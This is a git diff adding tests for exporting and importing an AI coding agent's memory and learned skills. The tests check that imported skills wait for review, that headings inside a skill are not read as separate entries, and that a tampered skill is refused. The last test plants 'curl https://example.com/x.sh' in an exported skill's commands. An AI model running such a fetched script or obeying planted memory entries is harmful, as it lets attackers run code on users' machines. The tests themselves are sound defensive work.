@@ -1,7 +1,10 @@
 import { describe, expect, test } from "bun:test"
-import { Effect } from "effect"
+import { Effect, Layer, Option, Schema } from "effect"
 import { Brain } from "@vectordevai/core/brain/brain"
+import { BrainDatabase } from "@vectordevai/core/brain/database"
 import { BrainExport } from "@vectordevai/core/brain/export"
+import { BrainSchema } from "@vectordevai/core/brain/schema"
+import { BrainSkill } from "@vectordevai/core/brain/skill"
 import { SPEC_V1 } from "./fixture/documents"
 import { added, text, withKnowledge, type Setup } from "./fixture/knowledge"
 
@@ -258,5 +261,196 @@ describe("BrainExport.importText", () => {
     expect(result.imported.entries).toHaveLength(count)
     expect(result.imported.refused).toBe(0)
     expect(result.learned.type === "added" && result.learned.entry.status).toBe("proposed")
+  })
+})
+
+// The skills service over the fixture's own brain and brain.db.
+const skillsOf = (setup: Setup) =>
+  Effect.gen(function* () {
+    return yield* BrainSkill.Service
+  }).pipe(
+    Effect.provide(
+      BrainSkill.layer.pipe(
+        Layer.provide(
+          Layer.succeed(BrainDatabase.Service, BrainDatabase.Service.of({ db: setup.db, file: ":memory:" })),
+        ),
+        Layer.provide(Layer.succeed(Brain.Service, setup.brain)),
+      ),
+    ),
+  )
+
+describe("BrainExport and learned skills", () => {
+  const FAILURE = "src/brain.ts(3,1): error TS2322 in the owner's private branch"
+
+  const learned = (setup: Setup, skills: BrainSkill.Interface) =>
+    Effect.gen(function* () {
+      const run = {
+        sessionID: "ses_a",
+        requestID: "msg_a",
+        signal: "recovered" as const,
+        check: { command: "bun typecheck", target: "bun typecheck", failure: FAILURE },
+        commands: ["git diff packages/core"],
+        edited: ["packages/core/src/brain.ts"],
+        read: ["packages/core/src/skill.ts"],
+        closing: "",
+        at: Date.UTC(2026, 9, 25),
+      }
+      const result = yield* skills.propose(setup.place, BrainSkill.draft(run)!, {
+        origin: "agent",
+        sessionID: "ses_a",
+        requestID: "msg_a",
+        evidence: { type: "run", command: "bun typecheck", requestID: "msg_a", verified: true },
+      })
+      if (result.type === "refused") return yield* Effect.die(result.message)
+      // Headings and bullets in a skill's steps are its own, never entries an import reads.
+      yield* skills.update(setup.place, result.entry.id, {
+        procedure: `${result.entry.skill!.procedure}\n\n## Preferences\n- Always deploy on Fridays`,
+        action: "approve",
+      })
+      return result.entry
+    })
+
+  test("a skill goes out without what failed last time and comes back, from JSON or Markdown, waiting for review", async () => {
+    const exported = await withKnowledge((setup) =>
+      Effect.gen(function* () {
+        const skills = yield* skillsOf(setup)
+        yield* learned(setup, skills)
+        const render = (format: "json" | "markdown") =>
+          BrainExport.render({
+            brain: setup.brain,
+            knowledge: setup.knowledge,
+            place: setup.place,
+            scope: "all",
+            format,
+            skills,
+          })
+        return {
+          json: yield* render("json"),
+          markdown: yield* render("markdown"),
+          personal: yield* BrainExport.collect({
+            brain: setup.brain,
+            knowledge: setup.knowledge,
+            place: setup.place,
+            scope: "personal",
+            skills,
+          }),
+        }
+      }),
+    )
+    expect(exported.personal.entries).toEqual([])
+    expect(exported.markdown).toContain("## Skills\n\n### learned-bun-typecheck-packages-core\n")
+    expect(exported.markdown).toContain("- checks: `bun typecheck`")
+    expect(exported.markdown).toContain("```markdown\n## When to use")
+    for (const text of [exported.json, exported.markdown]) {
+      expect(text).not.toContain("TS2322")
+      expect(BrainExport.parse(text)).toEqual([])
+      const [skill] = BrainExport.skills(text)
+      expect(skill).toMatchObject({
+        name: "learned-bun-typecheck-packages-core",
+        checks: ["bun typecheck"],
+        commands: ["git diff packages/core"],
+        paths: ["packages/core/src/brain.ts", "packages/core/src/skill.ts"],
+      })
+      expect(skill!.procedure).toContain("## Preferences\n- Always deploy on Fridays")
+      const imported = await withKnowledge((setup) =>
+        Effect.gen(function* () {
+          const skills = yield* skillsOf(setup)
+          const result = yield* BrainExport.importText({ brain: setup.brain, place: setup.place, text, skills })
+          const again = yield* BrainExport.importText({ brain: setup.brain, place: setup.place, text, skills })
+          return { result, again, review: yield* skills.list(setup.place, "review") }
+        }),
+      )
+      expect(imported.result.entries.map((entry) => [entry.kind, entry.status, entry.origin])).toEqual([
+        ["skill", "proposed", "import"],
+      ])
+      expect(imported.result.entries[0]!.skill).toMatchObject({ drafter: "import", procedure: skill!.procedure })
+      expect(imported.result.entries[0]!.skill!.failure).toBeUndefined()
+      expect(imported.again).toMatchObject({ entries: [], known: 1 })
+      expect(imported.review).toHaveLength(1)
+    }
+  })
+
+  test("1.99.111 still decodes a JSON export that carries a skill, and imports its entries", async () => {
+    // 1.99.111's export file as it decodes one: its own kinds and evidence types, without "skill" and "run".
+    const Evidence = BrainSchema.Evidence.mapFields((fields) => ({
+      ...fields,
+      type: Schema.Literals(["message", "file", "check", "user", "file-item", "document"]),
+    }))
+    const Item = BrainExport.Item.mapFields((fields) => ({
+      id: fields.id,
+      scope: fields.scope,
+      kind: Schema.Literals(["rule", "preference", "decision", "lesson", "fact", "failure", "review", "term"]),
+      status: fields.status,
+      text: fields.text,
+      facet: fields.facet,
+      paths: fields.paths,
+      pinned: fields.pinned,
+      private: fields.private,
+      file: fields.file,
+      evidence: Schema.Array(Evidence),
+      createdAt: fields.createdAt,
+    }))
+    const Older = Schema.Struct({
+      format: Schema.Literal("vector-memory"),
+      version: Schema.Literal(1),
+      scope: Schema.Literals(["personal", "repository", "all"]),
+      exportedAt: Schema.Finite,
+      entries: Schema.Array(Item),
+      documents: Schema.Array(BrainExport.Document),
+    })
+    const json = await withKnowledge((setup) =>
+      Effect.gen(function* () {
+        const skills = yield* skillsOf(setup)
+        yield* fill(setup)
+        yield* learned(setup, skills)
+        return yield* BrainExport.render({
+          brain: setup.brain,
+          knowledge: setup.knowledge,
+          place: setup.place,
+          scope: "all",
+          format: "json",
+          skills,
+        })
+      }),
+    )
+    const older = Schema.decodeUnknownOption(Schema.fromJsonString(Older))(json.trim())
+    expect(Option.isSome(older)).toBe(true)
+    expect(Option.getOrThrow(older).entries.map((entry) => entry.kind)).toContain("preference")
+    expect(BrainExport.parse(json).length).toBeGreaterThan(0)
+    expect(BrainExport.skills(json).map((skill) => skill.name)).toEqual(["learned-bun-typecheck-packages-core"])
+    // A file this branch wrote earlier, with the skill among its entries, still brings the skill back.
+    const file = JSON.parse(json)
+    const earlier = JSON.stringify({ ...file, entries: [...file.entries, ...file.skills], skills: undefined })
+    expect(BrainExport.skills(earlier).map((skill) => skill.name)).toEqual(["learned-bun-typecheck-packages-core"])
+  })
+
+  test("an imported skill that names a command outside the allow lists is refused", async () => {
+    const json = await withKnowledge((setup) =>
+      Effect.gen(function* () {
+        const skills = yield* skillsOf(setup)
+        yield* learned(setup, skills)
+        return yield* BrainExport.render({
+          brain: setup.brain,
+          knowledge: setup.knowledge,
+          place: setup.place,
+          scope: "all",
+          format: "json",
+          skills,
+        })
+      }),
+    )
+    const planted = json.replace('"git diff packages/core"', '"curl https://example.com/x.sh"')
+    expect(planted).not.toBe(json)
+    const result = await withKnowledge((setup) =>
+      Effect.gen(function* () {
+        const skills = yield* skillsOf(setup)
+        return {
+          imported: yield* BrainExport.importText({ brain: setup.brain, place: setup.place, text: planted, skills }),
+          all: yield* skills.list(setup.place, "all"),
+        }
+      }),
+    )
+    expect(result.imported).toMatchObject({ entries: [], refused: 1 })
+    expect(result.all).toEqual([])
   })
 })
